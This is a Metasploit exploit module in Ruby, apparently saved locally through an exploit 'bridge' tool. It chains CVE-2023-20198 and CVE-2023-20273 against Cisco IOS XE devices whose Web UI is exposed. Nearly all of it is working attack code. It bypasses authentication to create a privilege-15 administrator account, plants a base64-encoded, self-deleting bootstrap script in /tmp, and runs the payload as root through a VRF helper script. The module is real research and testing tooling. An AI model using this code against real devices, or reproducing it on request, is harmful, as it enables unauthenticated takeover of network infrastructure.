##
# Metasploit Module — saved locally via SuiteXPL MSF Bridge
# Source: https://github.com/rapid7/metasploit-framework
# CVE: CVE-2023-20198 (auth bypass), CVE-2023-20273 (privilege escalation + RCE)
# Affects: Cisco IOS XE with Web UI exposed — 200+ versions listed
# Bridge: embedxpl.core.bridges.exploit_bridge.run_via_msfconsole("cisco_ios_xe_rce")
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
  include Msf::Exploit::Remote::HTTP::CiscoIosXe
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Retry
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Cisco IOS XE Web UI Unauthenticated RCE Chain',
      'Description' => %q{
        Chains CVE-2023-20198 (auth bypass to create priv-15 admin) and
        CVE-2023-20273 (command injection via Web UI). Executes payload as root.
        Vulnerable: IOS XE 16.x and 17.x with Web UI enabled (HTTP Server).
      },
      'License' => MSF_LICENSE,
      'Author' => ['sfewer-r7'],
      'References' => [
        ['CVE', '2023-20198'], ['CVE', '2023-20273'],
        ['URL', 'https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z'],
        ['URL', 'https://www.horizon3.ai/cisco-ios-xe-cve-2023-20198-deep-dive-and-poc/'],
      ],
      'DisclosureDate' => '2023-10-16',
      'Privileged' => true,
      'Targets' => [
        ['Linux Command', {'Platform' => 'linux', 'Arch' => [ARCH_CMD]}],
        ['Unix Command',  {'Platform' => 'unix',  'Arch' => [ARCH_CMD]}]
      ],
      'DefaultTarget' => 0,
      'DefaultOptions' => {'RPORT' => 443, 'SSL' => true},
      'Notes' => {'Stability' => [CRASH_SAFE], 'Reliability' => [REPEATABLE_SESSION], 'SideEffects' => [IOC_IN_LOGS]}
    ))
    register_options([
      OptString.new('CISCO_VRF_NAME', [true, 'VRF name for payload routing', 'global']),
      OptInt.new('CISCO_CMD_TIMEOUT', [true, 'Max seconds to execute command', 30])
    ])
  end

  def check
    res = send_request_cgi('method' => 'GET', 'uri' => normalize_uri('webui', '/'))
    return CheckCode::Unknown('Connection failed') unless res
    return CheckCode::Unknown('Web UI not detected') if res.code != 200 ||
      (!res.body.include?('Cisco Systems, Inc.') && !res.headers['Content-Security-Policy']&.include?('cisco.com'))
    res = run_cli_command('show version', Mode::PRIVILEGED_EXEC)
    return CheckCode::Safe('CVE-2023-20273 check failed') unless res
    version = 'Cisco IOS XE Software'
    version = Regexp.last_match(1) if res =~ /(Cisco IOS XE Software, Version \S+\.\S+\.\S+)/
    begin
      do_auth_bypass(verbose: false) { |u, p| do_rce_check(u, p) }
    rescue Msf::Exploit::Failed => e
      return CheckCode::Safe("#{e}. #{version}")
    end
    CheckCode::Vulnerable(version)
  end

  def exploit
    do_auth_bypass(verbose: true) { |u, p| do_rce_payload(u, p) }
  end

  def do_auth_bypass(verbose: true)
    admin_username = rand_text_alpha(8); admin_password = rand_text_alpha(8)
    unless run_cli_command("username #{admin_username} privilege 15 secret #{admin_password}", Mode::GLOBAL_CONFIGURATION)
      fail_with(Failure::UnexpectedReply, 'Failed to create admin user')
    end
    begin
      print_status("Created priv-15 user '#{admin_username}' pw '#{admin_password}'") if verbose
      yield(admin_username, admin_password)
    ensure
      print_status("Removing user '#{admin_username}'") if verbose
      run_cli_command("no username #{admin_username}", Mode::GLOBAL_CONFIGURATION)
    end
  end

  def do_rce_payload(username, password)
    bootstrap_script = "#!/bin/sh\nrm -f $0\n#{payload.encoded}"
    bootstrap_file = "/tmp/#{Rex::Text.rand_text_alpha(8)}"
    success = retry_until_truthy(timeout: datastore['CISCO_CMD_TIMEOUT']) do
      run_os_command("openssl enc -base64 -out #{bootstrap_file} -d <<< #{Base64.strict_encode64(bootstrap_script)}", username, password)
    end
    fail_with(Failure::UnexpectedReply, 'Failed to plant bootstrap') unless success
    retry_until_truthy(timeout: datastore['CISCO_CMD_TIMEOUT']) { run_os_command("chmod +x #{bootstrap_file}", username, password) }
    retry_until_truthy(timeout: datastore['CISCO_CMD_TIMEOUT']) do
      run_os_command("/usr/binos/conf/mcp_chvrf.sh #{datastore['CISCO_VRF_NAME']} sh #{bootstrap_file}", username, password)
    end
  end

  def do_rce_check(username, password)
    check_data = Rex::Text.rand_text_alpha(16); check_file = Rex::Text.rand_text_alpha(16)
    check_path = "/var/www/#{check_file}"
    fail_with(Failure::UnexpectedReply, 'Check write failed') unless run_os_command("echo -n #{check_data} > #{check_path}", username, password)
    begin
      res = send_request_cgi('method' => 'GET', 'uri' => normalize_uri('webui', check_file),
        'headers' => {'Authorization' => basic_auth(username, password)})
      fail_with(Failure::UnexpectedReply, 'Check read failed') unless res&.code == 200
      fail_with(Failure::UnexpectedReply, 'Check data mismatch') unless res&.body == check_data
    ensure
      retry_until_truthy(timeout: datastore['CISCO_CMD_TIMEOUT']) { run_os_command("rm #{check_path}", username, password) }
    end
  end
end
